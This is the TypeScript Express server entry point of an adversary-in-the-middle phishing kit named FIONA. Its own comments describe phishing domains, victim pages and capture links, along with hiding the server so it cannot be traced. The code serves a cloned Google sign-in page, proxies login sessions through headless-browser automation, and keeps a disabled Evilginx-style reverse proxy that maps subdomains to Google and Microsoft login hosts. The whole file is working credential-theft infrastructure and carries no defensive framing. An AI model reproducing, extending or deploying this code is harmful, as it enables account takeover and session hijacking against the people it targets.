import express from "express";
import https from "https";
import fs from "fs";
import path from "path";
import cors from "cors";
import cookieParser from 'cookie-parser';
import dotenv from "dotenv";
import { config } from "./config";
import { logger } from "./utils/logger";
import { DomainMonitor } from "./services/domain-monitor";
import { nginxManager } from "./services/nginx-manager";
import { prisma } from "./lib/prisma";

dotenv.config();

// ✅ FORCE CONSOLE LOGS TO PM2
// Ensures all logs are captured by PM2 properly
console.log = (...args) => process.stdout.write(args.join(' ') + '\n');
console.error = (...args) => process.stderr.write(args.join(' ') + '\n');

const app = express();

// SERVER UNTRACEABILITY: Remove identifying headers
// This makes the server impossible to fingerprint or trace back to our infrastructure
app.use((req, res, next) => {
  // Remove Express fingerprint
  res.removeHeader("X-Powered-By");
  app.disable("x-powered-by");
  
  // Remove server identification
  res.removeHeader("Server");
  
  // Add generic server header (looks like any standard web server)
  res.setHeader("Server", "nginx");
  
  next();
});

// Dynamic CORS: Allow API panels + active phishing domains
app.use(cors({
  origin: async (origin, callback) => {
    if (!origin) return callback(null, true);
    
    const allowed = [
      'https://fioona.org',
      'https://admin.fioona.org',
      'http://localhost:3000',
      'http://localhost:3001'
    ];
    
    if (allowed.includes(origin)) return callback(null, true);
    
    try {
      const hostname = new URL(origin).hostname;
      const domain = await prisma.domain.findFirst({
        where: { domain: hostname, status: { in: ['ACTIVE', 'DNS_ACTIVE'] } }
      });
      if (domain) return callback(null, true);
    } catch {}
    
    callback(new Error('Not allowed by CORS'));
  },
  credentials: true
}));

app.use(cookieParser());

// Conditional body parsing - skip for capture routes and URL-based proxy
app.use((req, res, next) => {
  const hasSession = req.cookies?._fid;
  
  // CRITICAL FIX: Also skip body parsing for /{captureId}/ paths (transparent proxy)
  // Format: /7f5b1290/ServiceLogin or /7f5b1290/_/AccountsSignInUi/data/batchexecute
  const isCaptureIdPath = /^\/[a-f0-9]{8}\//.test(req.path);
  
  const isProxy = (hasSession || isCaptureIdPath) && !req.path.startsWith('/api') && req.path !== '/health';
  if (req.path.startsWith('/c/') || isProxy) return next();
  express.json()(req, res, next);
});

app.use((req, res, next) => {
  const hasSession = req.cookies?._fid;
  
  // CRITICAL FIX: Also skip body parsing for /{captureId}/ paths (transparent proxy)
  const isCaptureIdPath = /^\/[a-f0-9]{8}\//.test(req.path);
  
  const isProxy = (hasSession || isCaptureIdPath) && !req.path.startsWith('/api') && req.path !== '/health';
  if (req.path.startsWith('/c/') || isProxy) return next();
  express.urlencoded({ extended: true })(req, res, next);
});

// PROFESSIONAL APPROACH: NO general API rate limiting
// Users browsing dashboard for hours should never hit limits
// Rate limits applied ONLY to specific abuse-prone endpoints

logger.info(`[Server] Starting FIONA Backend - Mode: ${config.mockAuth ? "MOCK" : "PRODUCTION"}`);

if (config.mockAuth) {
  logger.warn("[Server] ⚠️  MOCK_AUTH enabled - Using mock data");
  
  const mockCapturesRouter = require("./routes/mock-captures").default;
  app.use(mockCapturesRouter);
}

const setupRouter = require("./routes/setup").default;
const authRouter = require("./routes/auth").default;
const domainsRouter = require("./routes/domains").default;
const capturesRouter = require("./routes/captures").default;
const sessionsRouter = require("./routes/sessions").default;
const analyticsRouter = require("./routes/analytics").default;
const providersRouter = require("./routes/providers").default;
const profilesRouter = require("./routes/profiles").default;
const adminRouter = require("./routes/admin").default;
const ipManagementRouter = require("./routes/ip-management").default;
const testGmailRouter = require("./routes/test-gmail").default;

// ✨ NEW: Headless Google Authentication Routes
const googleAuthRouter = require("./routes/google-auth.routes").default;
const adminPanelRouter = require("./routes/admin.routes").default;
const victimPagesRouter = require("./routes/victim-pages").default;

// =====================================================================
// OLD EVILGINX SUBDOMAIN PROXY - DISABLED
// =====================================================================
// The subdomain-based reverse proxy has been replaced with headless browser automation.
// All Google authentication now goes through /google page (real Chrome automation).
// This code is preserved but disabled - uncomment if needed for Microsoft/Office365.
// =====================================================================

// DISABLED: Old subdomain proxy middleware
/*
app.use(async (req, res, next) => {
  try {
    // Skip API and health endpoints
    if (req.path.startsWith('/api') || req.path === '/health') {
      return next();
    }

    // Extract subdomain from hostname
    // Example: accounts.cloud-dot-educ.org → subdomain = "accounts"
    const hostParts = req.hostname.split('.');
    
    // If hostname has less than 3 parts, it's the root domain (example.com or localhost)
    // Not a subdomain request - skip to next handler
    if (hostParts.length < 3 && req.hostname !== 'localhost') {
      return next();
    }
    
    const subdomain = hostParts[0];
    
    // Subdomain to target domain mapping (EVILGINX STANDARD)
    const subdomainMap: Record<string, string> = {
      'accounts': 'accounts.google.com',
      'www': 'www.google.com',
      'google': 'www.google.com',
      'gstatic': 'www.gstatic.com',
      'ssl': 'ssl.gstatic.com',
      'apis': 'apis.google.com',
      'content': 'content.googleapis.com',
      'fonts': 'fonts.googleapis.com',
      'play': 'play.google.com',
      'ogs': 'ogs.google.com',
      'myaccount': 'myaccount.google.com',
      'mail': 'mail.google.com',
      'id': 'id.google.com',
      // Microsoft subdomains
      'login': 'login.microsoftonline.com',
      'account': 'account.microsoft.com',
    };

    const targetDomain = subdomainMap[subdomain];
    
    if (!targetDomain) {
      // Not a recognized proxy subdomain - might be root domain or unknown subdomain
      return next();
    }

    // Get session ID from secure cookie (not URL!)
    const captureId = req.cookies._fiona_session || req.cookies._capture_session;
    
    if (!captureId) {
      logger.warn(`[Proxy] No session cookie for ${req.hostname}${req.path}`);
      res.status(403).send('Session required');
      return;
    }

    logger.info(`[Proxy] ${req.method} ${req.hostname}${req.path} → ${targetDomain}${req.path}`);

    // Load session from database
    const session = await prisma.session.findUnique({
      where: { id: captureId }
    });

    if (!session || session.browserMode !== 'CAPTURE') {
      logger.warn(`[Proxy] Invalid session: ${captureId}`);
      res.clearCookie('_fiona_session');
      res.clearCookie('_capture_session');
      res.status(404).send('Session expired');
      return;
    }

    // Proxy the request (clean path, no captureId prefix!)
    const { enterpriseProxyEngine } = await import('./proxy/enterprise-proxy-engine');
    await enterpriseProxyEngine.handleRequest(
      req, res, captureId, session.provider.toLowerCase(), session, targetDomain
    );
    
  } catch (err: any) {
    logger.error('[Proxy] Error:', err.message);
    next();
  }
});
*/
// END OF DISABLED PROXY CODE

// =====================================================================
// API ROUTES - ACTIVE
// =====================================================================

app.use("/api/setup", setupRouter);
app.use("/api/auth", authRouter);
app.use("/api/domains", domainsRouter);
app.use("/api/captures", capturesRouter); // API endpoint for generating links
app.use("/api/sessions", sessionsRouter);
app.use("/api/analytics", analyticsRouter);
app.use("/api/providers", providersRouter);
app.use("/api/profiles", profilesRouter);
app.use("/api/admin", adminRouter);
app.use("/api/ip-management", ipManagementRouter);

// ✨ NEW: Headless Google Authentication API
app.use("/api/google", googleAuthRouter); // /api/google/login/initiate, etc.
app.use("/api/admin", adminPanelRouter); // /api/admin/profiles, /active-sessions, etc.
app.use("/api", victimPagesRouter); // /api/victim-pages/google/export

// =====================================================================
// SYSTEM ROUTES - Health check and root
// =====================================================================

app.get("/health", (req, res) => {
  res.json({
    status: "healthy",
    timestamp: new Date().toISOString(),
    mode: config.mockAuth ? "mock" : "production",
  });
});

// =====================================================================
// GOOGLE LOGIN PAGE - Serve professional Google UI
// =====================================================================

// Serve static assets (CSS, JS, fonts) from google-working folder
app.use(express.static(path.join(__dirname, '../victim-pages/google-working'), {
  setHeaders: (res, filepath) => {
    // Set proper MIME types
    if (filepath.endsWith('.css')) res.setHeader('Content-Type', 'text/css');
    if (filepath.endsWith('.js')) res.setHeader('Content-Type', 'application/javascript');
    if (filepath.endsWith('.woff2')) res.setHeader('Content-Type', 'font/woff2');
    if (filepath.endsWith('.ico')) res.setHeader('Content-Type', 'image/x-icon');
    
    // Fix CORS for fonts and assets
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
  }
}));

// Main Google login page
app.get("/google", (req, res) => {
  const captureId = req.query.s;
  
  if (!captureId) {
    return res.status(400).send("Missing capture ID");
  }
  
  logger.info(`[Google] Serving professional UI for capture: ${captureId}`);
  
  // Serve the working Google sign-in HTML (exact copy from lab)
  const htmlPath = path.join(__dirname, '../victim-pages/google-working/index.html');
  res.sendFile(htmlPath, (err) => {
    if (err) {
      logger.error(`[Google] Failed to serve HTML: ${err.message}`);
      res.status(500).send('Internal server error');
    }
  });
});

// TEST ROUTE - Gmail proxy testing without domain
app.use("/", testGmailRouter);

// =====================================================================
// CAPTURE LINK HANDLER - Handles victim clicking capture link
// =====================================================================
// This MUST come AFTER specific routes like /health, /api, etc.
// Handles: https://domain.com/abc12345 (shows CAPTCHA then redirects to /google)
app.use("/", capturesRouter); // This router has /:captureId handler

app.get("/", (req, res) => {
  res.json({
    service: "FIONA Design Platform",
    version: "2.0.0",
    status: "operational",
  });
});

// =====================================================================
// OLD CATCH-ALL PROXY HANDLER - DISABLED
// =====================================================================
// This was for forwarding unmapped paths to the reverse proxy
// Now disabled as we're using headless browser automation instead
/*
app.all("/:captureId/*", async (req, res, next) => {
  try {
    // Extract captureId
    const captureId = req.params.captureId;
    
    // Validate captureId format (8 hex chars)
    if (!/^[a-f0-9]{8}$/.test(captureId)) {
      return next(); // Not a valid captureId, continue to 404
    }
    
    logger.info(`[Catch-All] Forwarding unmapped path: ${req.path} → Proxy`);
    
    // Get session
    const session = await prisma.session.findUnique({
      where: { id: captureId }
    });
    
    if (!session || session.browserMode !== 'CAPTURE') {
      return next(); // No valid session, continue to 404
    }
    
    // Forward to proxy engine
    const { enterpriseProxyEngine } = await import('./proxy/enterprise-proxy-engine');
    await enterpriseProxyEngine.handleRequest(
      req, res, captureId, session.provider.toLowerCase(), session
    );
  } catch (error: any) {
    logger.error(`[Catch-All] Error: ${error.message}`);
    next();
  }
});
*/
// END OF DISABLED CATCH-ALL HANDLER

// =====================================================================
// 404 HANDLER
// =====================================================================

app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
  });
});

app.use((error: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
  logger.error("[Server] Unhandled error:", error);
  res.status(500).json({
    success: false,
    error: "Internal server error",
  });
});

const PORT = config.port;
const ENABLE_SSL = process.env.ENABLE_SSL === "true";

// Start server with optional SSL support
const startServer = () => {
  if (ENABLE_SSL) {
    // HTTPS mode (for production with origin SSL certificates)
    const sslCertPath = process.env.SSL_CERT_PATH || "/etc/fiona/ssl/cloudflare-origin-cert.pem";
    const sslKeyPath = process.env.SSL_KEY_PATH || "/etc/fiona/ssl/cloudflare-origin-key.pem";
    
    try {
      if (!fs.existsSync(sslCertPath)) {
        logger.error(`❌ SSL certificate not found: ${sslCertPath}`);
        logger.info("💡 To generate Cloudflare Origin Certificate:");
        logger.info("   1. Go to Cloudflare Dashboard → SSL/TLS → Origin Server");
        logger.info("   2. Click 'Create Certificate'");
        logger.info("   3. Save certificate and key to the paths in .env");
        logger.info("   OR set ENABLE_SSL=false in .env for development");
        process.exit(1);
      }
      
      if (!fs.existsSync(sslKeyPath)) {
        logger.error(`❌ SSL private key not found: ${sslKeyPath}`);
        process.exit(1);
      }
      
      const sslOptions = {
        cert: fs.readFileSync(sslCertPath),
        key: fs.readFileSync(sslKeyPath),
      };
      
      https.createServer(sslOptions, app).listen(PORT, async () => {
        logger.info(`[Server] ✓ FIONA Backend running on HTTPS port ${PORT}`);
        logger.info(`[Server] 🔐 SSL: ENABLED (Origin Certificate)`);
        logger.info(`[Server] ✓ Mock mode: ${config.mockAuth}`);
        logger.info(`[Server] 📜 Certificate: ${sslCertPath}`);
        
        // ✅ Restart monitoring for pending domains
        await DomainMonitor.restartPendingMonitoring();

        // ✅ Configure Nginx for all active domains on startup
        try {
          const activeDomains = await prisma.domain.findMany({
            where: { status: "ACTIVE" },
            select: { domain: true },
          });

          logger.info(`[Startup] Checking Nginx configs for ${activeDomains.length} active domains`);

          for (const d of activeDomains) {
            if (!nginxManager.configExists(d.domain)) {
              await nginxManager.createDomainConfig(d.domain).catch(e =>
                logger.error(`[Startup] Nginx config failed for ${d.domain}: ${e.message}`)
              );
            }
          }
        } catch (nginxError: any) {
          logger.error(`[Startup] Nginx startup check failed:`, nginxError.message);
        }
      });
    } catch (error) {
      logger.error("❌ Failed to start HTTPS server:", error);
      process.exit(1);
    }
  } else {
    // HTTP mode (for development/localhost)
    const server = app.listen(PORT, async () => {
      logger.info(`[Server] ✓ FIONA Backend running on HTTP port ${PORT}`);
      logger.info(`[Server] ⚠️  SSL: DISABLED (Development mode)`);
      logger.info(`[Server] ✓ Mock mode: ${config.mockAuth}`);
      logger.info(`[Server] 💡 For production, set ENABLE_SSL=true in .env`);
      
      // ✅ Restart monitoring for pending domains
      await DomainMonitor.restartPendingMonitoring();

      // ✅ Configure Nginx for all active domains on startup
      try {
        const activeDomains = await prisma.domain.findMany({
          where: { status: "ACTIVE" },
          select: { domain: true },
        });

        logger.info(`[Startup] Checking Nginx configs for ${activeDomains.length} active domains`);

        for (const d of activeDomains) {
          if (!nginxManager.configExists(d.domain)) {
            await nginxManager.createDomainConfig(d.domain).catch(e =>
              logger.error(`[Startup] Nginx config failed for ${d.domain}: ${e.message}`)
            );
          }
        }
      } catch (nginxError: any) {
        logger.error(`[Startup] Nginx startup check failed:`, nginxError.message);
      }
    });

    // Handle WebSocket upgrades for real-time proxying
    server.on("upgrade", async (req, socket, head) => {
      try {
        // Check if this is a capture path with WebSocket upgrade
        const path = req.url || "/";
        const captureMatch = path.match(/^\/c\/([a-f0-9-]{36})/);
        
        if (captureMatch) {
          const captureId = captureMatch[1];
          
          // Load session to get provider
          const session = await prisma.session.findUnique({
            where: { id: captureId },
          });

          if (!session) {
            logger.error(`[WebSocketProxy] Session not found: ${captureId}`);
            socket.destroy();
            return;
          }

          const { WebSocketProxy } = await import("./proxy/websocket-proxy");
          WebSocketProxy.handleUpgrade(req, socket, head, captureId, session.provider.toLowerCase());
        } else {
          // Not a capture path - close connection
          socket.destroy();
        }
      } catch (error: any) {
        logger.error("[WebSocketProxy] Upgrade error:", error.message);
        socket.destroy();
      }
    });
  }
};

startServer();

export default app;
